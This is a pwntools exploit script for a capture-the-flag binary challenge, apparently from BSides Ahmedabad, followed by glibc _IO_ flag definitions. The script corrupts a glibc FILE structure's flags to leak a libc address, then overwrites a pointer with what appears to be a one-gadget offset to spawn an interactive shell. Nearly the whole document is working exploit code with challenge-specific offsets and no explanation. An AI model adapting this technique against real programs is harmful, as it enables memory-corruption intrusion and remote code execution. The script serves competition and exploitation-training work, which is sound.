#!/usr/bin/env python3
from pwn import *
import time

def wdev(c):
	p.recvuntil("> ")
	p.sendline("2")
	p.recvuntil("> ")
	p.send(c)
def wstdout(c):
	p.recvuntil("> ")
	p.sendline("3")
	p.recvuntil("> ")
	p.send(c)
def walloced(c):
	p.recvuntil("> ")
	p.sendline("1")
	p.recvuntil("> ")
	p.send(c)
def wlocal(c):
	p.recvuntil("> ")
	p.sendline("0")
	p.recvuntil("> ")
	p.send(c)

p = process("./chall",aslr=False)
# p = remote("pwn.bsidesahmedabad.in",9090)
wstdout("A\n")
flag = 0xFBAD0000 #magic
flag|= 0x2000 #filebuf
flag|= 0x0080 #linked
flag|= 0x1 # userbuf
flag|= 0x4 # no_read
flag|= 0x0200 # IO_LINE_BUF
print(hex(flag))
c = p64(flag)
c+= b"\xb8\x86"
c+= b"\n"
walloced(c)
input()
flag = 0xFBAD0000 #magic
flag|= 0x2000 #filebuf
flag|= 0x0080 #linked
flag|= 0x1 # userbuf
flag|= 0x4 # no_read
flag|= 0x0800 # _IO_CURRENTLY_PUTTING
flag|= 0x1000 # _IO_IS_APPENDING

c = p64(flag)
c+= b"\n"
time.sleep(0.1)
p.sendline("1")
time.sleep(0.1)
p.send(c)
input()
leak = int.from_bytes(p.recvn(100,timeout=2)[30:30+8],byteorder="little") - 0x16a0 - 0x1eb000
if(leak & 0xff != 0):
	exit(1)
print(hex(leak))

wlocal((p64(leak+0x1eeb28)*4)[:-1])
walloced(p64(leak+0xe6c7e)+b"\n")
wdev(b"A\n")

p.interactive()


#define _IO_MAGIC         0xFBAD0000 /* Magic number */
#define _IO_MAGIC_MASK    0xFFFF0000
#define _IO_USER_BUF          0x0001 /* Don't deallocate buffer on close. */
#define _IO_UNBUFFERED        0x0002
#define _IO_NO_READS          0x0004 /* Reading not allowed.  */
#define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */
#define _IO_EOF_SEEN          0x0010
#define _IO_ERR_SEEN          0x0020
#define _IO_DELETE_DONT_CLOSE 0x0040 /* Don't call close(_fileno) on close.  */
#define _IO_LINKED            0x0080 /* In the list of all open files.  */
#define _IO_IN_BACKUP         0x0100
#define _IO_LINE_BUF          0x0200
#define _IO_TIED_PUT_GET      0x0400 /* Put and get pointer move in unison.  */
#define _IO_CURRENTLY_PUTTING 0x0800
#define _IO_IS_APPENDING      0x1000
#define _IO_IS_FILEBUF        0x2000